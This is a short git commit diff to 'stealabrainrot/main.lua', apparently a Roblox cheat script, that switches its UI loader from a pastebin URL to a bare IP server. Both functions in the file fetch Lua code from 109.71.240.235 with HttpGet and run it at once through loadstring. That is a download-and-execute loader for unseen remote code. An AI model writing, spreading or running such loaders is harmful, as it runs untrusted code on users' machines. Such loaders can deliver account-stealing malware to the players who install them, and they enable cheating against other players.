5d2ebe7a013ff4f2bf5a38eeef5e13d73f7387b4
laplacefr <newbeginningrblx@gmail.com>
2025-10-16 21:53:41 +0800

    Update main.lua

--- stealabrainrot/main.lua
+++ stealabrainrot/main.lua
@@ -2,7 +2,7 @@ local function main()
     loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://pastebin.com/raw/P57G9HHs"))()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 end
 task.spawn(main)
 task.spawn(loadui)
